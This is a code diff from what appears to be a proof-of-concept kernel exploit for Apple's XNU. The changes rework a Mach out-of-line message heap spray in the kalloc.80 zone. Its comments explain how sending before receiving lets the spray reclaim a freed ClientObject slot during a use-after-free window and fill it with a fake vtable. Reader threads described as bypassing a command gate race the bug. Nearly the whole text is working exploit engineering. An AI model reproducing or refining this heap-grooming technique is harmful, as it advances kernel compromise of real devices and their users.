@@ -3597,9 +3597,13 @@ static const char kOpenPropertiesGarbage[] =
     dispatch_semaphore_t sprayStarted = NULL;
 
     // ---- Mach OOL spray thread — kalloc.80 alloc/free cycling ----
-    // CRITICAL: start spray BEFORE other threads so it's actively cycling when
-    // the UAF window opens. Use semaphore to confirm at least one full recv+send
-    // cycle completed before dispatching lifecycle/churn/reader threads.
+    // CRITICAL: send BEFORE recv in each cycle. kalloc is LIFO: recv-then-send
+    // self-circulates (recv frees slot → freelist head → send gets same slot back).
+    // Send-first means the send gets whatever slot the rest of the kernel last freed
+    // (e.g. ClientObject's slot after closeForClient), then recv frees to make room.
+    //
+    // Start: port queue has 5 pre-filled messages (full). Pre-drain 1 → 4 in queue,
+    // 1 slot on freelist. Then loop: send → queue full (5), recv → queue has room (4).
     dispatch_queue_t sprayQueue = NULL;
     if (sprayReady) {
         sprayQueue = dispatch_queue_create("com.testpoc.lifecycle.spray",
@@ -3607,38 +3611,23 @@ static const char kOpenPropertiesGarbage[] =
         sprayStarted = dispatch_semaphore_create(0);
         dispatch_group_enter(group);
         dispatch_async(sprayQueue, ^{
-            // First recv+send cycle: confirm spray is working before signal
+            // Pre-drain one message: make room for send-first loop.
+            // The freed kalloc.80 slot goes to freelist (seeds with our data).
             {
-                OOLMsg rcvMsg;
-                rcvMsg.header.msgh_local_port = sprayPort;
-                rcvMsg.header.msgh_size = sizeof(OOLMsg);
-                kern_return_t rkr = mach_msg(&rcvMsg.header, MACH_RCV_MSG, 0, sizeof(OOLMsg), sprayPort, 0, MACH_PORT_NULL);
-
-                OOLMsg sndMsg;
-                memset(&sndMsg, 0, sizeof(sndMsg));
-                sndMsg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
-                sndMsg.header.msgh_size = sizeof(OOLMsg);
-                sndMsg.header.msgh_remote_port = sprayPort;
-                sndMsg.body.msgh_descriptor_count = 1;
-                sndMsg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
-                sndMsg.ool.address = sprayPayload;
-                sndMsg.ool.size = kOolDataSize;
-                sndMsg.ool.deallocate = FALSE;
-                sndMsg.ool.copy = MACH_MSG_VIRTUAL_COPY;
-                kern_return_t skr = mach_msg(&sndMsg.header, MACH_SEND_MSG, sizeof(OOLMsg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
-
-                if (rkr == MACH_MSG_SUCCESS && skr == MACH_MSG_SUCCESS) {
+                OOLMsg drainMsg;
+                drainMsg.header.msgh_local_port = sprayPort;
+                drainMsg.header.msgh_size = sizeof(OOLMsg);
+                kern_return_t drkr = mach_msg(&drainMsg.header, MACH_RCV_MSG, 0, sizeof(OOLMsg), sprayPort, 0, MACH_PORT_NULL);
+                if (drkr == MACH_MSG_SUCCESS) {
                     dispatch_semaphore_signal(sprayStarted);
                 }
             }
 
-            // Continuous cycling during UAF window
+            // Send-first cycling: each send allocates a NEW kalloc.80 slot from the
+            // freelist head (LIFO). If the kernel just freed ClientObject, its slot
+            // is at the freelist head and our send fills it with our fake vtable.
             while (atomic_load(&stopFlag) == 0) {
-                OOLMsg rcvMsg;
-                rcvMsg.header.msgh_local_port = sprayPort;
-                rcvMsg.header.msgh_size = sizeof(OOLMsg);
-                mach_msg(&rcvMsg.header, MACH_RCV_MSG, 0, sizeof(OOLMsg), sprayPort, 0, MACH_PORT_NULL);
-
+                // SEND first — alloc from freelist head (may get ClientObject's slot)
                 OOLMsg sndMsg;
                 memset(&sndMsg, 0, sizeof(sndMsg));
                 sndMsg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
@@ -3651,6 +3640,12 @@ static const char kOpenPropertiesGarbage[] =
                 sndMsg.ool.deallocate = FALSE;
                 sndMsg.ool.copy = MACH_MSG_VIRTUAL_COPY;
                 mach_msg(&sndMsg.header, MACH_SEND_MSG, sizeof(OOLMsg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
+
+                // RECV second — frees one slot to make room for next send
+                OOLMsg rcvMsg;
+                rcvMsg.header.msgh_local_port = sprayPort;
+                rcvMsg.header.msgh_size = sizeof(OOLMsg);
+                mach_msg(&rcvMsg.header, MACH_RCV_MSG, 0, sizeof(OOLMsg), sprayPort, 0, MACH_PORT_NULL);
             }
 
             // No drain needed — port destroy (cleanup section) frees remaining messages
@@ -3658,10 +3653,10 @@ static const char kOpenPropertiesGarbage[] =
         });
     }
 
-    // ---- Block until spray thread confirms first recv+send cycle ----
+    // ---- Block until spray thread confirms pre-drain complete ----
     if (sprayStarted) {
         dispatch_semaphore_wait(sprayStarted, dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC));
-        [self appendLog:@"  Spray thread confirmed cycling"];
+        [self appendLog:@"  Spray thread confirmed cycling (send-first)"];
     }
 
     // ---- Reader threads — copyEvent on conn[1..readerEnd] (bypasses command gate) ----
